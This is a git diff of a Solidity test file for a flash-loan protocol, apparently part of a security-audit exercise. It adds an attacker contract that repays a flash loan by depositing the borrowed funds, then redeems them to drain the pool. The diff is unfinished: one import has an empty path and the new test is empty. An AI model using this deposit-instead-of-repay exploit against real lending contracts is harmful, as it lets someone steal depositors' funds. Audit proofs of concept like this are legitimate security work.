@@ -5,6 +5,7 @@ import { Test, console } from "forge-std/Test.sol";
 import { BaseTest, ThunderLoan } from "./BaseTest.t.sol";
 import { AssetToken } from "../../src/protocol/AssetToken.sol";
 import { MockFlashLoanReceiver } from "../mocks/MockFlashLoanReceiver.sol";
+import { ERC20Mock } from ""
 
 contract ThunderLoanTest is BaseTest {
     uint256 constant AMOUNT = 10e18;
@@ -88,17 +89,40 @@ contract ThunderLoanTest is BaseTest {
         assertEq(mockFlashLoanReceiver.getBalanceAfter(), AMOUNT - calculatedFee);
     }
 
-    function testRedeem() public setAllowedToken hasDeposits {
-        uint256 amountToBorrow = AMOUNT * 10;
-        uint256 calculatedFee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
+    function testUseDepositInsteadOfRepay() public setAllowedToken hasDeposits {
+        
+    }
+    
 
-        vm.startPrank(user);
-        tokenA.mint(address(mockFlashLoanReceiver), calculatedFee);
-        thunderLoan.flashloan(address(mockFlashLoanReceiver), tokenA, amountToBorrow, "");
-        vm.stopPrank();
+}
 
-        uint256 amountToRedeem = type(uint256).max;
-        vm.prank(liquidityProvider);
-        thunderLoan.redeem(tokenA, amountToRedeem);
+contract DepositOverRepay is IFlashLoanReceiver {
+    ThunderLoan thunderLoan;
+    AssetToken assetToken;
+    IERC20 s_token;
+
+    constructor(address _thunderLoan) {
+        thunderLoan = ThunderLoan(_thunderLoan);
+    }
+
+    function executeOperation(
+        address token,
+        uint256 amount,
+        uint256 fee,
+        address, /*initiator*/
+        bytes calldata /*params*/
+    )
+        external
+        returns (bool)
+    {
+        s_token = IERC20(token);
+        assetToken = thunderLoan.getAssetFromToken(IERC20(token));
+        thunderLoan.deposit(IERC20(token), amount + fee);
+        return true;
+    }
+
+    function redeemMoney() external {
+        uint256 amount = assetToken.balanceOf(address(this));
+        thunderLoan.redeem(s_token, amount);
     }
 }
